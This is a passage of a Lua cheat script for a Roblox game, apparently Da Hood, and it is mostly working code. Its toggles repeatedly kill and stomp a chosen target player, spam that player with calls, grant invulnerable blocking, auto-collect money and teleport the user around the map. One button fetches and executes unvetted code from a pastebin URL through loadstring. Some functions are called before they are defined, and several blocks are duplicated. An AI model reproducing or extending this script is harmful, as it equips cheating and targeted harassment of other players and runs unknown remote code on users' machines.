            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
            originalPosition = nil
        end
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if loopkill and player.Name == _G.targetPlayer.Name then
        if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
            combatTool = game.Players.LocalPlayer.Backpack.Combat
            combatTool.Parent = game.Players.LocalPlayer.Character
        end
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if loopkill and player.Name == _G.targetPlayer.Name then
        if combatTool then
            combatTool.Parent = game.Players.LocalPlayer.Backpack
            combatTool = nil
        end
        if targetCharacter then
            _G.targetPlayer.CameraMode = Enum.CameraMode.Classic
            targetCharacter = nil
            isViewingPlayer = false -- Stop viewing the player
        end
    end
end)

game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    if loopkill and _G.targetPlayer and game.Players.LocalPlayer == _G.targetPlayer then
        if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
            combatTool = game.Players.LocalPlayer.Backpack.Combat
            combatTool.Parent = game.Players.LocalPlayer.Character
        end
    end
end)

game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
    if loopkill and combatTool then
        combatTool.Parent = game.Players.LocalPlayer.Character
    end
end)

game:service("RunService").RenderStepped:Connect(function()
    if loopkill and game.Players[_G.targetPlayer.Name].Character.BodyEffects["K.O"].Value == false then
        if game.Players.LocalPlayer.Character:FindFirstChild('Combat') then
            game.Players.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
        end
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[_G.targetPlayer.Name].Character.UpperTorso.Position) * CFrame.new(0,-5,0)
        game.Workspace.Camera.CameraSubject = isViewingPlayer and game:GetService("Players")[_G.targetPlayer.Name].Character.Humanoid or nil -- Only set CameraSubject if viewing player
    else
        if loopkill and game.Players[_G.targetPlayer.Name].Character.BodyEffects["K.O"].Value == true then
            if game.Players[_G.targetPlayer.Name].Character.BodyEffects.Dead.Value == false then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[_G.targetPlayer.Name].Character.UpperTorso.Position) * CFrame.new(0,3,0)
                game.Workspace.Camera.CameraSubject = isViewingPlayer and game:GetService("Players")[_G.targetPlayer.Name].Character.Humanoid or nil -- Only set CameraSubject if viewing player
                game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            else
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
            end
        end
    end
end)
--END

local calltarget = false

local function spamCall()
    local player = _G.targetPlayer
    if player then
        calltarget = true
        while calltarget do
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
            wait()
            if game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]") then
                game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]").Parent = game.Players.LocalPlayer.Character
            end
            wait()
            game:GetService("ReplicatedStorage").MainEvent:FireServer("PhoneCall", player.Name)
            wait(0.5)
        end
    else
        print("Player not found.")
    end
end

local spamCallToggle = Section:NewToggle("Spam Call", false, function(Value)
    calltarget = Value
    if Value then
        spamCall()
    end
end)

Section:NewLabel("stand")

local ownerUsername = "" -- Initialize owner username variable

local ownerTextBox = Section:NewTextBox("Owner Name", "Enter part of the player's Username or Display Name to teleport to", function(name)
    ownerUsername = name
end)

local settings = {
    ['Position'] = 'Back', 
    ['CrewID'] = 32570691, 
    ['Attack'] = 'Heavy', 
    ['StandMode'] = 'Star Platinum', 
    ['FlyMode'] = 'Heaven', 
    ['Prediction'] = 0.3, 
    ['GunPrediction'] = 0.3, 
    ['AttackMode'] = 'Under', 
    ['GunMode'] = 'Under', 
    ['Resolver'] = true, 
    ['LowGraphics'] = false, 
    ['AntiStomp'] = true, 
    ['CustomName'] = 'Master', 
    ['Hidescreen'] = false, 
    ['ChatCmds'] = true, 
    ['AutoMask'] = true, 
    ['FPSCAP'] = true, 
    ['Msg'] = 'Yare Yare Daze.', 
    ['Alt'] = false,
    ['Sounds'] = false, 
    ['SummonMusic'] = false, 
    ['CustomSong'] = 8713037614 
}

Section:NewButton("be target stand", "be someone stand", function()
    if ownerUsername == "" then -- Check if owner username is empty
        warn("Please enter a username or display name first.")
        return
    end

    local player = nil
    for _, p in ipairs(game.Players:GetPlayers()) do
        if string.find(string.lower(p.Name), string.lower(ownerUsername), 1, true) or
           string.find(string.lower(p.DisplayName), string.lower(ownerUsername), 1, true) then
            player = p
            break
        end
    end
    
    if player then
        getgenv().Credit = 'Lol' -- Don't change this.
        getgenv().Owner = player.Name -- Set owner username to player's actual username
        getgenv().Settings = settings -- Set settings

loadstring(game:HttpGet("https://pastebin.com/raw/NBU07nGN"))()
    else
        warn("Player not found.")
    end
end)

local Tab = Window:NewTab("Toggles")
local Section = Tab:NewSection("Toggles")

local godBlockEnabled = false -- Variable to track if god block is enabled
local godBlockLoop = nil -- Variable to hold the loop for toggling the god block effect
local hideBlockEnabled = false -- Variable to track if hide block animation is enabled

local function enableGodBlock()
    godBlockLoop = game:GetService("RunService").Heartbeat:Connect(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects") then
            local bodyEffects = game.Players.LocalPlayer.Character.BodyEffects
            if bodyEffects:FindFirstChild('Block') then
                bodyEffects.Block:Destroy()
            end
            game.ReplicatedStorage.MainEvent:FireServer("Block", true)
            wait()
            game.ReplicatedStorage.MainEvent:FireServer("Block", false)
        end
    end)
end

local function disableGodBlock()
    if godBlockLoop then
        godBlockLoop:Disconnect()
        godBlockLoop = nil
    end
end

local function toggleHideBlock(enabled)
    hideBlockEnabled = enabled
    if enabled then
        game:GetService('RunService'):BindToRenderStep("HideBlock", 0 , function()
            wait()
            if godBlockEnabled then
                local Plr = game.Players.LocalPlayer
                for _,v in pairs(Plr.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                    if v.Name == 'Block' then
                        v:Stop()
                    end
                end
            end
        end)
    else
        game:GetService('RunService'):UnbindFromRenderStep("HideBlock")
    end
end

local toggleGodBlock = Section:NewToggle("God Block", false, function(enabled)
    godBlockEnabled = enabled
    if enabled then
        enableGodBlock()
    else
        disableGodBlock()
    end
end)

local toggleHideAnimation = Section:NewToggle("Hide Block Animation", false, function(enabled)
    toggleHideBlock(enabled)
end)

local isStompAnimationHidden = false -- Variable to track toggle state
local renderStepName = "HideStompAnimationRenderStep"
local renderStepId = nil

local function stopStompAnimation()
    local Plr = game.Players.LocalPlayer
    local humanoid = Plr.Character:FindFirstChildOfClass('Humanoid')
    if humanoid and humanoid:IsDescendantOf(game) then
        for _, v in pairs(humanoid:GetPlayingAnimationTracks()) do
            if v.Name == 'Stomp' then
                v:Stop()
            end
        end
    end
end

local function toggleStompAnimation()
    if isStompAnimationHidden then
        stopStompAnimation()
    end
end

local function bindRenderStep()
    if not renderStepId then
        renderStepId = game:GetService('RunService'):BindToRenderStep(renderStepName, 0, function()
            toggleStompAnimation()
        end)
    end
end

local function unbindRenderStep()
    if renderStepId then
        game:GetService('RunService'):UnbindFromRenderStep(renderStepId)
        renderStepId = nil
    end
end

local Toggle = Section:NewToggle("Hide stomp animation", false, function(isToggled)
    isStompAnimationHidden = isToggled
    if isStompAnimationHidden then
        bindRenderStep()
    else
        unbindRenderStep()
    end
end)

local function ResetCharacter()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        local humanoid = LocalPlayer.Character.Humanoid
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)  -- Disable the dead state sound temporarily
        humanoid:ChangeState(15)
        task.wait()
        humanoid:ChangeState(16)
        task.wait()
        humanoid:ChangeState(0)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)  -- Re-enable the dead state sound
    end
end

local antistomp = false
local hasReset = false  -- Variable to track whether the reset has been triggered

Section:NewToggle("Anti Stomp unpatched", false, function(bool)
    antistomp = bool
    if bool then
        spawn(function()
            while antistomp do
                local LocalPlayer = game:GetService("Players").LocalPlayer
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("K.O").Value == true then
                    if not hasReset then  -- Check if the reset has not been triggered yet
                        hasReset = true  -- Set the flag to true to prevent further resets
                        ResetCharacter()
                    end
                else
                    hasReset = false
                end
                wait()
            end
        end)
        
        -- Listen for the CharacterRemoving event to detect reset button presses
        game:GetService("Players").LocalPlayer.CharacterRemoving:Connect(function()
            hasReset = true  -- Set the flag to true when the character is being removed (reset button pressed)
        end)
    else
        -- Code to execute when anti-stomp is disabled
        -- ResetCharacter() -- This line is removed to prevent the reset when toggled off
    end
end)

local antiGrabEnabled = false

Section:NewToggle("Anti Grab", false, function(enabled)
    antiGrabEnabled = enabled
end)

game:GetService("RunService").RenderStepped:Connect(function()
    if antiGrabEnabled then
        local grabbingConstraint = game.Players.LocalPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT")
        if grabbingConstraint then
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
            wait()
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
            wait()
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
        end
    end
end)

Section:NewToggle("Anti stomp", false, ToggleAntiStomp)

Section:NewSlider("Anti Stomp Health", "for anti stomp", 100, 0, function(value)
    selectedHealth = value
end)

local function SetupAntiStomp()
    local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    humanoid.HealthChanged:Connect(HandleHealthChange)
end

SetupAntiStomp()

game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    SetupAntiStomp()
end)

local selectedHealth = 50
local antiStompEnabled = false

local function ToggleAntiStomp(value)
    antiStompEnabled = value
end

local function HandleHealthChange(health)
    if antiStompEnabled and health <= selectedHealth then
        game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
        wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
        wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
    end
end

Section:NewToggle("Anti stomp v2", false, ToggleAntiStomp)

Section:NewSlider("Anti Stomp Health", "for anti sromp", 100, 0, function(value)
    selectedHealth = value
end)

local function SetupAntiStomp()
    local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    humanoid.HealthChanged:Connect(HandleHealthChange)
end

SetupAntiStomp()

game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    SetupAntiStomp()
end)

Section:NewToggle("Admin sprint", false, function(bool)
    if bool then
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        
        if char.BodyEffects.Movement:FindFirstChild("FastSprint") then
            char.BodyEffects.Movement.FastSprint:Destroy()
        end
        
        local SuperSpeed = Instance.new("IntValue")
        SuperSpeed.Name = "FastSprint"
        SuperSpeed.Parent = char.BodyEffects.Movement
    else
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        
        if char.BodyEffects.Movement:FindFirstChild("FastSprint") then
            char.BodyEffects.Movement.FastSprint:Destroy()
        end
    end
end)

Section:NewToggle("Admin Jump", false, function(bool)
    if bool then
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        
        if char.BodyEffects.Movement:FindFirstChild("HighJump") then
            char.BodyEffects.Movement.HighJump:Destroy()
        end
        
        local SuperSpeed = Instance.new("IntValue")
        SuperSpeed.Name = "HighJump"
        SuperSpeed.Parent = char.BodyEffects.Movement
    else
        local ps = game:GetService("Players")
        local lp = ps.LocalPlayer
        local char = lp.Character
        
        if char.BodyEffects.Movement:FindFirstChild("HighJump") then
            char.BodyEffects.Movement.HighJump:Destroy()
        end
    end
end)

Section:NewToggle("Auto Reload", false, function(p)
    if p == true then
        game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
            if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
                if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
                        wait(1)
                    end
                end
            end
        end)
    elseif p == false then
        game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
    end
end)

local autoBlockEnabled = false -- Variable to track the state of auto block

local toggle = Section:NewToggle("Auto Block", false, function(enabled)
    autoBlockEnabled = enabled
end)

game:GetService('RunService'):BindToRenderStep("Auto-Block", 0 , function()
    if autoBlockEnabled then
        local MainEvent = game:GetService('ReplicatedStorage').MainEvent
        local player = game.Players.LocalPlayer
        local Distancia = 15 -- Here put the distance to activate

        local forbidden = {'[Popcorn]','[HotDog]','[GrenadeLauncher]','[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
        local Found = false

        for _,v in pairs(game.Workspace.Players:GetChildren()) do
            if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= Distancia then
                if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name then
                    Found = true
                    MainEvent:FireServer('Block', player.Name)
                end
            end
        end
    end
end)

Section:NewToggle("Auto Stomp", "ToggleInfo", function(state)
    if state then
        
_G.Toggle = true

while _G.Toggle do
wait()
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
end
    else
        
_G.Toggle = false

while _G.Toggle do
wait()
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
end
    end
end)

Section:NewToggle("Cash aura", false, function(state)
if state then
                                    
    getgenv().CashAura = game:GetService("RunService").Heartbeat:Connect(function()
        for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
            if v:IsA('Part') then
                if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                    fireclickdetector(v:FindFirstChild('ClickDetector'))
                end
            end
        end
        end)
                                    else
                                        getgenv().CashAura:Disconnect()
                                    end
                                    end)

Section:NewToggle("Auto Drop", false, function(state)
if state then
                                            getgenv().AutoDrop = game:GetService("RunService").Heartbeat:Connect(function()
                                                local args = {
                                                    [1] = "DropMoney",
                                                    [2] = "10000"
                                                }
                                                
                                                game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))

                                            end)
                                        else
                                            getgenv().AutoDrop:Disconnect()
                                        end
                                        end)

local autoArmorEnabled = false -- Variable to track if auto armor is enabled
local shouldBuyArmor = false -- Variable to track if armor should be bought

local toggle = Section:NewToggle("Auto Armor 5 s delay", false, function(enabled) 
    autoArmorEnabled = enabled -- Update the state of auto armor when the toggle is changed
    if enabled then
        shouldBuyArmor = true -- Set the flag to buy armor when the toggle is enabled
    else
        shouldBuyArmor = false -- Reset the flag when the toggle is disabled
    end
end)

local PERCENT_TO_BUY_ARMOR = 1 --\\ percent of armor left that u want to buy
local COMMAND_TO_STOP_BUYING = '/e stop' --\\ message to stop buying

------------------------
------------------------

local Stopped = false
local Player = game.Players.LocalPlayer

function Main1()
    while wait() do
        if autoArmorEnabled and shouldBuyArmor then -- Only execute auto armor logic if it's enabled and buy flag is set
            local function AutoArmor()
                local Origin = Player.Character.HumanoidRootPart.CFrame
                local Armor = Player.Character.BodyEffects.Armor
                if Armor.Value <= PERCENT_TO_BUY_ARMOR and Stopped == false and Player.DataFolder.Currency.Value >= 1000 then
                    repeat
                        wait()    
                        Player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1061"].Head.CFrame
                        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1061"].ClickDetector)
                    until Armor.Value >= 100 or Player.DataFolder.Currency.Value < 1000 or Stopped == true
                    Player.Character.HumanoidRootPart.CFrame = Origin
                end
            end
            local s,e = pcall(AutoArmor)
        end
    end
end

function Main2()
    Player.Chatted:Connect(function(msg)
        if msg == COMMAND_TO_STOP_BUYING and Stopped == false then
            Stopped = true
            announce('stopped buying', '',5)
        end
    end)
end

coroutine.resume(coroutine.create(Main1))
coroutine.resume(coroutine.create(Main2))

local autoArmorEnabled = false -- Variable to track if auto armor is enabled
local shouldBuyArmor = false -- Variable to track if armor should be bought

local toggle = Section:NewToggle("Auto High Medium Armor", false, function(enabled) 
    autoArmorEnabled = enabled -- Update the state of auto armor when the toggle is changed
    if enabled then
        shouldBuyArmor = true -- Set the flag to buy armor when the toggle is enabled
    else
        shouldBuyArmor = false -- Reset the flag when the toggle is disabled
    end
end)

local PERCENT_TO_BUY_ARMOR = 1 --\\ percent of armor left that u want to buy
local COMMAND_TO_STOP_BUYING = '/e stop' --\\ message to stop buying

------------------------
------------------------

local Stopped = false
local Player = game.Players.LocalPlayer

function Main1()
    while wait() do
        if autoArmorEnabled and shouldBuyArmor then -- Only execute auto armor logic if it's enabled and buy flag is set
            local function AutoArmor()
                local Origin = Player.Character.HumanoidRootPart.CFrame
                local Armor = Player.Character.BodyEffects.Armor
                if Armor.Value <= PERCENT_TO_BUY_ARMOR and Stopped == false and Player.DataFolder.Currency.Value >= 1000 then
                    repeat
                        wait()    
                        Player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[High-Medium Armor] - $2440"].Head.CFrame
                        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[High-Medium Armor] - $2440"].ClickDetector)
                    until Armor.Value >= 100 or Player.DataFolder.Currency.Value < 1000 or Stopped == true
                    Player.Character.HumanoidRootPart.CFrame = Origin
                end
            end
            local s,e = pcall(AutoArmor)
        end
    end
end

function Main2()
    Player.Chatted:Connect(function(msg)
        if msg == COMMAND_TO_STOP_BUYING and Stopped == false then
            Stopped = true
            announce('stopped buying', '',5)
        end
    end)
end

coroutine.resume(coroutine.create(Main1))
coroutine.resume(coroutine.create(Main2))

local Tab = Window:NewTab("teleports")
local Section = Tab:NewSection("teleports")

Section:NewButton("Uphill Gunstore", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.3045959472656, 48.07050323486328, -620.1513671875)
end)
Section:NewButton("Downhill Gunstore", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.5796508789062, 8.314779281616211, -736.3884887695312)
end)
Section:NewButton("Hood Fitness", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-76.4957275390625, 22.700284957885742, -630.9816284179688)
end)
Section:NewButton("Bar", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.5504455566406, 48.52669143676758, -446.29254150390625)
end)
Section:NewButton("Bank", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-432.1439208984375, 38.9649658203125, -284.1016540527344)
end)
Section:NewButton("safe 2", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-117, -57, 147)
end)
Section:NewButton("safe 3", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-546, 173, 1)
end)
Section:NewButton("safe 5", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,150,0)
end)
Section:NewButton("safe for test", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(11, 12, 214)
end)
Section:NewButton("Da Furniture", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-489.1640319824219, 21.8498477935791, -76.60957336425781)
end)
Section:NewButton("School", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-531.3531494140625, 21.74999237060547, 252.47506713867188)
end)
Section:NewButton("Da Casino", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-863.4664306640625, 21.59995460510254, -152.92788696289062)
end)
Section:NewButton("Da Theatre", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1004.9942626953125, 25.10002326965332, -135.17315673828125)
end)
Section:NewButton("Basketball Court", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-896.5643310546875, 21.999818801879883, -528.7317504882812)
end)
Section:NewButton("Hair Salon", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-855.55810546875, 22.005008697509766, -665.0170288085938)
end)
Section:NewButton("FoodsMart", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-906.5833740234375, 22.005002975463867, -653.2225952148438)
end)
Section:NewButton("Mat Laundry", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-971.4241333007812, 22.005887985229492, -630.115478515625)
end)
Section:NewButton("Swift", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-799.7603149414062, 21.8799991607666, -662.3109741210938)
end)
Section:NewButton("Military Base", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-50.412960052490234, 25.25499725341797, -868.921142578125)
end)
Section:NewButton("Da Boxing Club", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-232.0669708251953, 22.067293167114258, -1119.9541015625)
end)
Section:NewButton("Flowers", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-71.62272644042969, 23.15056800842285, -327.79412841796875)
end)
Section:NewButton("Hospital", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(98.40196228027344, 22.799989700317383, -484.89385986328125)
end)
Section:NewButton("Hood Kicks", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-203.53347778320312, 21.845796585083008, -410.1529846191406)
end)
Section:NewButton("Police Station", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-265.4999694824219, 21.797977447509766, -96.51517486572266)
end)
Section:NewButton("Barba", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9.003872871398926, 21.74802017211914, -107.73101043701172)
end)
Section:NewButton("Church", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(205.8213653564453, 23.77802085876465, -58.47077560424805)
end)
Section:NewButton("Train", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-426.41705322265625, -21.25197982788086, 44.953758239746094)
end)

local Tab = Window:NewTab("animations")
local Section = Tab:NewSection("animations")

Section:NewButton("animation dahood", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
    local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
    
    for i,v in next, Hum:GetPlayingAnimationTracks() do
        v:Stop()
    end
    wait(1)
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3119980985"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3119980985"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2791325054"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=3135793091"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2791328524"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true   
end)

Section:NewButton("animation bold", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
    local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
    
    for i,v in next, Hum:GetPlayingAnimationTracks() do
        v:Stop()
    end
    wait(1)
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=16738333868"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=16738334710"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=16738340646"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=16738337225"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=16738336650"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=16738332169"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=16738333171"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

Section:NewButton("animation best", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
    local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
    
    for i,v in next, Hum:GetPlayingAnimationTracks() do
        v:Stop()
    end
    wait(1)
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=3135793091"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2791328524"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true   
    
end)

Section:NewButton("animation MEGA", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"

game.Players.LocalPlayer.Character.Humanoid.Jump = true    
    
end)

Section:NewButton("animatoin flying(Levitation)", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
game.Players.LocalPlayer.Character.Humanoid.Jump = true  
end)

Section:NewButton("animation JOJO", "fake animation", function()
    local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end
wait(1)
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
Animate.run.RunAnim.AnimationId = "rbxassetid://1150967949"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
Animate.walk.WalkAnim.AnimationId = "rbxassetid://657552124"
Animate.climb.ClimbAnim.AnimationId = "rbxassetid://658360781"
Animate.fall.FallAnim.AnimationId = "rbxassetid://1148863382"
Animate.swim.Swim.AnimationId = "rbxassetid://657560551"
Animate.swimidle.SwimIdle.AnimationId = "rbxassetid://657557095"
game.Players.LocalPlayer.Character.Humanoid.Jump = true    
end)

Section:NewButton("cool animation", "fake animation", function()
local Char = game.Players.LocalPlayer.Character
